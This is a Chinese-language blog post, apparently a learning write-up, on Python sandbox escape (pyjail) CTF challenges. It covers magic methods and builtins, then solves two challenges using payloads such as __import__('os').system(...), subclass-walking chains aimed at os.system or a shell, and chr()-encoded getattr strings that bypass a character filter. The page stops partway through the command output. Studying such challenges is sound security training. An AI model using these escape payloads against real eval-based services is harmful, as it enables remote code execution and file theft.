<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Python沙箱逃逸 | deCOLE's Blog</title><meta name="author" content="deCOLE"><meta name="copyright" content="deCOLE"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Python沙箱逃逸">
<meta property="og:type" content="article">
<meta property="og:title" content="Python沙箱逃逸">
<meta property="og:url" content="http://example.com/2025/03/18/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/index.html">
<meta property="og:site_name" content="deCOLE&#39;s Blog">
<meta property="og:description" content="Python沙箱逃逸">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/touxiang.jpg">
<meta property="article:published_time" content="2025-03-17T16:00:00.000Z">
<meta property="article:modified_time" content="2025-05-27T07:51:49.004Z">
<meta property="article:author" content="deCOLE">
<meta property="article:tag" content="漏洞学习">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/touxiang.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Python沙箱逃逸",
  "url": "http://example.com/2025/03/18/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/",
  "image": "http://example.com/img/touxiang.jpg",
  "datePublished": "2025-03-17T16:00:00.000Z",
  "dateModified": "2025-05-27T07:51:49.004Z",
  "author": [
    {
      "@type": "Person",
      "name": "deCOLE",
      "url": "http://example.com/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/touxiang.jpg"><link rel="canonical" href="http://example.com/2025/03/18/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Python沙箱逃逸',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(img/qccq.jpg);"></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">deCOLE's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">Python沙箱逃逸</span></a></span><div id="menus"></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">Python沙箱逃逸</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-17T16:00:00.000Z" title="发表于 2025-03-18 00:00:00">2025-03-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-05-27T07:51:49.004Z" title="更新于 2025-05-27 15:51:49">2025-05-27</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="container post-content" id="article-container"><h1 id="Python沙箱逃逸"><a href="#Python沙箱逃逸" class="headerlink" title="Python沙箱逃逸"></a>Python沙箱逃逸</h1><p>​	在学了SSTI之后，发现Python还有一个沙箱逃逸没学，恰好这玩意又和框架啥的挨上边，为了知识的连贯性，决定做一个沙箱逃逸的学习</p>
<h2 id="一些前置知识的介绍"><a href="#一些前置知识的介绍" class="headerlink" title="一些前置知识的介绍"></a>一些前置知识的介绍</h2><h3 id="沙箱"><a href="#沙箱" class="headerlink" title="沙箱"></a>沙箱</h3><p>python沙箱逃逸，是CTF当中的一类题的统称（PYjail）</p>
<p>​	为了不让恶意用户执行任意恶意的python代码，我们引用了沙箱机制，一些可能存在恶意攻击代码的语句就能在沙箱环境当中运行，沙箱内可能会禁用一些敏感函数，使得恶意代码只作用于沙箱内，而不会对我们的服务器以及其他资产造成破坏</p>
<p>​	<strong>常见的沙箱技术</strong></p>
<ol>
<li><p>模块沙箱</p>
<p>如restrictedpython和PyExecJS，这些工具可以在独立的执行环境当中运行python代码，并限制访问系统资源。通常它们会提供一组允许和禁止的操作，也就是黑白名单，来控制代码的行为</p>
<p>​    代码示例</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from restrictedpython import compile_restricted, safe_builtins</span><br><span class="line"></span><br><span class="line">code = &quot;&quot;&quot;</span><br><span class="line">result = 1 + 1</span><br><span class="line">print(result)</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">restricted_globals = &#123;&quot;__builtins__&quot;: safe_builtins&#125;</span><br><span class="line">bytecode = compile_restricted(code, &quot;&lt;string&gt;&quot;, &quot;exec&quot;)</span><br><span class="line">exec(bytecode, restricted_globals)</span><br></pre></td></tr></table></figure>
</li>
<li><p>容器化技术</p>
<p>还有一些沙箱技术是通过容器化技术来达成的，比如我们熟悉的Docker，能够将不受信任的代码在一个独立的容器里面运行，隔离危害，使其无法访问主机系统资源</p>
<p>​    代码示例</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --rm python:3.9 python -c &quot;print(&#x27;Hello, from inside the container!&#x27;)&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>专用的沙箱库</p>
<p>Python当中有一些专用的沙箱库，也能够拿来运行沙箱，比如PySandbox和PyPySandbox</p>
</li>
</ol>
<h3 id="Python的一些特性"><a href="#Python的一些特性" class="headerlink" title="Python的一些特性"></a>Python的一些特性</h3><ul>
<li><p>在python中，类均继承自<code>object</code>基类；</p>
</li>
<li><p>python中类本身具有一些静态方法，如<code>bytes.fromhex</code>、<code>int.from_bytes</code>等。对于这些类的实例，也能调用这些静态方法。如<code>b&#39;1&#39;.fromhex(&#39;1234&#39;)</code>，返回<code>b&#39;\x124&#39;</code>。（一个特殊的例子是整数常量不支持这样操作，如输入<code>3.from_bytes</code>会报错）</p>
</li>
<li><p>python中的类还具有一系列的魔术方法，这个特性可以对比php的魔术方法，以及C++的运算符重载等。一些函数的实现也是直接调用魔术方法的。常用的魔术方法有这些，更多可参考<a href="https://link.zhihu.com/?target=https://rszalski.github.io/magicmethods/">这里</a>：</p>
<ul>
<li><p><code>__init__</code>：构造函数。这个在实例化类的时候就会用到，一般是接受类初始化的参数，并且进行一系列初始化操作。</p>
</li>
<li><p><code>__len__</code>：返回对象的长度。对一个对象<code>a</code>使用<code>len(a)</code>时，会尝试调用<code>a.__len__()</code>。这个做炼丹的同学应该很熟悉，例如要通过继承<code>torch.utils.data.Dataset</code>来实现自己的数据集时，就需要实现这个方法；</p>
</li>
<li><p><code>__str__</code>：返回对象的字符串表示。对一个对象<code>a</code>使用<code>str(a)</code>时，会尝试调用<code>a.__str__()</code>。这在我们自己实现一些类，譬如复数、二叉树、有限域、椭圆曲线等时，通过实现该方法，能将对象的内容较好地打印出来。（<code>print</code>函数中也会自动调用对象的<code>__str__</code>方法）相似地，还有<code>__int__</code>魔术方法也用于类型转换，不过较少使用；</p>
</li>
<li><p><code>__getitem__</code>：根据索引返回对象的某个元素。对一个对象<code>a</code>使用<code>a[1]</code>时，会尝试调用<code>a.__getitem__(1)</code>。同样，当我们通过继承<code>torch.utils.data.Dataset</code>来实现自己的数据集时，就需要实现这个方法。有<code>__getitem__</code>，自然也有对应的<code>__setitem__</code>；</p>
</li>
<li><p><code>__add__</code>、<code>__sub__</code>、<code>__mul__</code>、<code>__div__</code>、<code>__mod__</code>：算术运算，加减乘除模。如对一个对象<code>a</code>使用<code>a+b</code>时，会尝试调用<code>a.__add__(b)</code>。相应地，对于有些运算，对象需放在后面（第二个操作数）的，则需实现<code>__radd__</code>、<code>__rsub__</code>、<code>__rmul__</code>、<code>__rdiv__</code>、<code>__rmod__</code>，如椭圆曲线上的点的倍点运算<code>G -&gt; d * G</code>，就可以通过实现<code>__rmul__</code>来实现。</p>
</li>
<li><p><code>__and__</code>，<code>__or__</code>、<code>__xor__</code>：逻辑运算，和算术运算类似；</p>
</li>
<li><p><code>__eq__</code>，<code>__ne__</code>、<code>__lt__</code>、<code>__gt__</code>、<code>__le__</code>、<code>__ge__</code>：比较运算，和算术运算类似；例如<code>&#39;贵州&#39; &gt; &#39;广西&#39;</code>，就会转而调用<code>&#39;贵州&#39;.__gt__(&#39;广西&#39;)</code>；</p>
</li>
<li><p><code>__getattr__</code>：对象是否含有某属性。如果我们对对象<code>a</code>所对应的类实现了该方法，那么在调用未实现的<code>a.b</code>时，就会转而调用<code>a.__getattr__(b)</code>。这也等价于用函数的方法调用：<code>getattr(a, &#39;b&#39;)</code>。有<code>__getattr__</code>，自然也有对应的<code>__setattr__</code>；</p>
</li>
<li><p><code>__subclasses__</code>：返回当前类的所有子类。一般是用在<code>object</code>类中，在<code>object.__subclasses__()</code>中，我们可以找到<code>os</code>模块中的类，然后再找到<code>os</code>，并且执行<code>os.system</code>，实现RCE。</p>
</li>
</ul>
</li>
<li><p>相对应地，python的类中也包含着一些魔术属性：</p>
<ul>
<li><pre><code>__dict__
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">：可以查看内部所有属性名和属性值组成的字典。譬如下面这段代码：</span><br><span class="line"></span><br><span class="line">```py</span><br><span class="line">class KFCCrazyThursday:</span><br><span class="line">    vivo = 50</span><br><span class="line"></span><br><span class="line">print(KFCCrazyThursday.__dict__)</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
</ul>
<p>就能看到字典中包含<code>&#39;vivo&#39;: 50</code>的键值对。<strong>注意在python中，<code>dict()</code>是将类转成字典的函数，跟此魔术属性无关。</strong></p>
<ul>
<li><pre><code>__doc__
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">：类的帮助文档。默认类均有帮助文档。对于自定义的类，需要我们自己实现。</span><br><span class="line"></span><br><span class="line">```py</span><br><span class="line">class KFCCrazyThursday:</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    And you broke up for seven years, you still can affect my mood, I still keep our photo, remember your birthday, OK? I have countless times to find your impulse, But still hold back, this message I do not block you, because I am your forever blacklist, but I love you, from the past to the present, a full love of you for eight years, But now I&#x27;m not sad, because I have no idea who wrote this or who this girl is, and I just want to tell you by the way: Today is Crazy Thursday, I want to eat KFC</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    vivo = 50</span><br><span class="line"></span><br><span class="line">print(KFCCrazyThursday.__doc__)</span><br></pre></td></tr></table></figure>

就会打印上面的文档；

- `__class__`：返回当前对象所属的类。如`&#39;&#39;.__class__`会返回`&lt;class &#39;str&#39;&gt;`。拿到类之后，就可以通过构造函数生成新的对象，如`&#39;&#39;.__class__(4396)`，就等价于`str(4396)`，即`&#39;4396&#39;`；

- `__base__`：返回当前类的基类。如`str.__base__`会返回`&lt;class &#39;object&#39;&gt;`；
</code></pre>
</li>
</ul>
</li>
<li><p>以及还有一些重要的内置函数和变量：</p>
<ul>
<li><code>dir</code>：查看对象的所有属性和方法。在我们没有思路的时候，可以通过该函数查看所有可以利用的方法；此外，在题目禁用引号以及小数点时，也可以先用拿到类所有可用方法，再索引到方法名，并且通过<code>getattr</code>来拿到目标方法。</li>
<li><code>chr</code>、<code>ord</code>：字符与ASCII码转换函数，能帮我们绕过一些WAF</li>
<li><code>globals</code>：返回所有全局变量的函数；</li>
<li><code>locals</code>：返回所有局部变量的函数；</li>
<li><code>__import__</code>：载入模块的函数。例如<code>import os</code>等价于<code>os = __import__(&#39;os&#39;)</code>；</li>
<li><code>__name__</code>：该变量指示当前运行环境位于哪个模块中。如我们python一般写的<code>if __name__ == &#39;__main__&#39;:</code>，就是来判断是否是直接运行该脚本。如果是从另外的地方import的该脚本的话，那<code>__name__</code>就不为<code>__main__</code>，就不会执行之后的代码。更多参考<a href="https://link.zhihu.com/?target=https://www.geeksforgeeks.org/__name__-a-special-variable-in-python/">这里</a>；</li>
<li><code>__builtins__</code>：包含当前运行环境中默认的所有函数与类。如上面所介绍的所有默认函数，如<code>str</code>、<code>chr</code>、<code>ord</code>、<code>dict</code>、<code>dir</code>等。在pyjail的沙箱中，往往<code>__builtins__</code>被置为<code>None</code>，因此我们不能利用上述的函数。所以一种思路就是我们可以先通过类的基类和子类拿到<code>__builtins__</code>，再<code>__import__(&#39;os&#39;).system(&#39;sh&#39;)</code>进行RCE；</li>
<li><code>__file__</code>：该变量指示当前运行代码所在路径。如<code>open(__file__).read()</code>就是读取当前运行的python文件代码。需要注意的是，<strong>该变量仅在运行代码文件时会产生，在运行交互式终端时不会有此变量</strong>；</li>
<li><code>_</code>：该变量返回上一次运行的python语句结果。需要注意的是，<strong>该变量仅在运行交互式终端时会产生，在运行代码文件时不会有此变量</strong>。</li>
</ul>
</li>
</ul>
<p>前置理论导完了，做一些题来试试手吧</p>
<h2 id="做题环节"><a href="#做题环节" class="headerlink" title="做题环节"></a>做题环节</h2><h4 id="calc-jail-beginner"><a href="#calc-jail-beginner" class="headerlink" title="calc_jail_beginner"></a>calc_jail_beginner</h4><p>进入题目</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271531097.png?raw=true" alt="image-20240604183805679"></p>
<p>给了个附件，下载看发现是源码</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271531031.png?raw=true" alt="image-20240604184350341"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#Your goal is to read ./flag.txt</span><br><span class="line">#You can use these payload liked `__import__(&#x27;os&#x27;).system(&#x27;cat ./flag.txt&#x27;)` or `print(open(&#x27;/flag.txt&#x27;).read())`</span><br><span class="line"></span><br><span class="line">WELCOME = &#x27;&#x27;&#x27;</span><br><span class="line">  _     ______      _                              _       _ _ </span><br><span class="line"> | |   |  ____|    (_)                            | |     (_) |</span><br><span class="line"> | |__ | |__   __ _ _ _ __  _ __   ___ _ __       | | __ _ _| |</span><br><span class="line"> | &#x27;_ \|  __| / _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|  _   | |/ _` | | |</span><br><span class="line"> | |_) | |___| (_| | | | | | | | |  __/ |    | |__| | (_| | | |</span><br><span class="line"> |_.__/|______\__, |_|_| |_|_| |_|\___|_|     \____/ \__,_|_|_|</span><br><span class="line">               __/ |                                           </span><br><span class="line">              |___/                                            </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">print(WELCOME)</span><br><span class="line"></span><br><span class="line">print(&quot;Welcome to the python jail&quot;)</span><br><span class="line">print(&quot;Let&#x27;s have an beginner jail of calc&quot;)</span><br><span class="line">print(&quot;Enter your expression and I will evaluate it for you.&quot;)</span><br><span class="line">input_data = input(&quot;&gt; &quot;)</span><br><span class="line">print(&#x27;Answer: &#123;&#125;&#x27;.format(eval(input_data)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到前面就给了paylod,直接用就行</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271531799.png?raw=true" alt="image-20240604184457273"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__import__(&#x27;os&#x27;).system(&#x27;cat ./flag.txt&#x27;)</span><br><span class="line"></span><br><span class="line">print(open(&#x27;/flag.txt&#x27;).read())</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271531860.png?raw=true" alt="image-20240604185356962"></p>
<h4 id="calc-jail-beginner-level1"><a href="#calc-jail-beginner-level1" class="headerlink" title="calc_jail_beginner_level1"></a>calc_jail_beginner_level1</h4><p>进入题目</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271531303.png?raw=true" alt="image-20240604185535230"></p>
<p>附件给的源码长这个样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#the function of filter will banned some string &#x27;,&quot;,i,b</span><br><span class="line">#it seems banned some payload </span><br><span class="line">#Can u escape it?Good luck!</span><br><span class="line"></span><br><span class="line">def filter(s):</span><br><span class="line">    not_allowed = set(&#x27;&quot;\&#x27;`ib&#x27;)</span><br><span class="line">    return any(c in not_allowed for c in s)</span><br><span class="line"></span><br><span class="line">WELCOME = &#x27;&#x27;&#x27;</span><br><span class="line">  _                _                           _       _ _   _                _ __ </span><br><span class="line"> | |              (_)                         (_)     (_) | | |              | /_ |</span><br><span class="line"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| || |</span><br><span class="line"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ || |</span><br><span class="line"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ || |</span><br><span class="line"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_||_|</span><br><span class="line">              __/ |                          _/ |                                  </span><br><span class="line">             |___/                          |__/                                                                                      </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">print(WELCOME)</span><br><span class="line"></span><br><span class="line">print(&quot;Welcome to the python jail&quot;)</span><br><span class="line">print(&quot;Let&#x27;s have an beginner jail of calc&quot;)</span><br><span class="line">print(&quot;Enter your expression and I will evaluate it for you.&quot;)</span><br><span class="line">input_data = input(&quot;&gt; &quot;)</span><br><span class="line">if filter(input_data):</span><br><span class="line">    print(&quot;Oh hacker!&quot;)</span><br><span class="line">    exit(0)</span><br><span class="line">print(&#x27;Answer: &#123;&#125;&#x27;.format(eval(input_data)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到定义了一个filter，我们的输入不能包含双引号、单引号、反引号、字母<code>i</code>和字母<code>b</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">所以，import`、`__builtins__`、`bytes这些就在这用不了了</span><br></pre></td></tr></table></figure>

<p>由常规思路来进行推导</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()</span><br><span class="line">//获取当前类——&gt;获取当前类的基类——&gt;返回当前类的所有子类</span><br></pre></td></tr></table></figure>

<p>然后进一步是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getattr(().__class__, &#x27;__base__&#x27;).__subclasses__()</span><br><span class="line">//获取当前类——&gt;获取当前类的基类——&gt;返回当前类的所有子类——&gt;返回子类列表</span><br></pre></td></tr></table></figure>

<p>但是很可惜的是单引号双引号和字母b都被ban了</p>
<p>我们还可以用ASCII🐎绕过的方法尝试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)</span><br><span class="line">//这一串的值为&#x27;_base_&#x27;</span><br></pre></td></tr></table></figure>

<p>于是我们可以将这玩意替换掉我们先前带b的base</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(().__class__, chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)).__subclasses__()</span><br></pre></td></tr></table></figure>

<p>但是还有一个subclasses，我们用同样的方法进行绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(getattr(().__class__,chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271531058.png?raw=true" alt="image-20240604192406689"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Welcome to the python jail</span><br><span class="line">Let&#x27;s have an beginner jail of calc</span><br><span class="line">Enter your expression and I will evaluate it for you.</span><br><span class="line">&gt; getattr(getattr(().__class__,chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()</span><br><span class="line">Answer: [&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;async_generator&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray_iterator&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes_iterator&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;builtin_function_or_method&#x27;&gt;, &lt;class &#x27;callable_iterator&#x27;&gt;, &lt;class &#x27;PyCapsule&#x27;&gt;, &lt;class &#x27;cell&#x27;&gt;, &lt;class &#x27;classmethod_descriptor&#x27;&gt;, &lt;class &#x27;classmethod&#x27;&gt;, &lt;class &#x27;code&#x27;&gt;, &lt;class &#x27;complex&#x27;&gt;, &lt;class &#x27;coroutine&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;, &lt;class &#x27;dict_itemiterator&#x27;&gt;, &lt;class &#x27;dict_keyiterator&#x27;&gt;, &lt;class &#x27;dict_valueiterator&#x27;&gt;, &lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;mappingproxy&#x27;&gt;, &lt;class &#x27;dict_reverseitemiterator&#x27;&gt;, &lt;class &#x27;dict_reversekeyiterator&#x27;&gt;, &lt;class &#x27;dict_reversevalueiterator&#x27;&gt;, &lt;class &#x27;dict_values&#x27;&gt;, &lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;ellipsis&#x27;&gt;, &lt;class &#x27;enumerate&#x27;&gt;, &lt;class &#x27;float&#x27;&gt;, &lt;class &#x27;frame&#x27;&gt;, &lt;class &#x27;frozenset&#x27;&gt;, &lt;class &#x27;function&#x27;&gt;, &lt;class &#x27;generator&#x27;&gt;, &lt;class &#x27;getset_descriptor&#x27;&gt;, &lt;class &#x27;instancemethod&#x27;&gt;, &lt;class &#x27;list_iterator&#x27;&gt;, &lt;class &#x27;list_reverseiterator&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;longrange_iterator&#x27;&gt;, &lt;class &#x27;member_descriptor&#x27;&gt;, &lt;class &#x27;memoryview&#x27;&gt;, &lt;class &#x27;method_descriptor&#x27;&gt;, &lt;class &#x27;method&#x27;&gt;, &lt;class &#x27;moduledef&#x27;&gt;, &lt;class &#x27;module&#x27;&gt;, &lt;class &#x27;odict_iterator&#x27;&gt;, &lt;class &#x27;pickle.PickleBuffer&#x27;&gt;, &lt;class &#x27;property&#x27;&gt;, &lt;class &#x27;range_iterator&#x27;&gt;, &lt;class &#x27;range&#x27;&gt;, &lt;class &#x27;reversed&#x27;&gt;, &lt;class &#x27;symtable entry&#x27;&gt;, &lt;class &#x27;iterator&#x27;&gt;, &lt;class &#x27;set_iterator&#x27;&gt;, &lt;class &#x27;set&#x27;&gt;, &lt;class &#x27;slice&#x27;&gt;, &lt;class &#x27;staticmethod&#x27;&gt;, &lt;class &#x27;stderrprinter&#x27;&gt;, &lt;class &#x27;super&#x27;&gt;, &lt;class &#x27;traceback&#x27;&gt;, &lt;class &#x27;tuple_iterator&#x27;&gt;, &lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;str_iterator&#x27;&gt;, &lt;class &#x27;str&#x27;&gt;, &lt;class 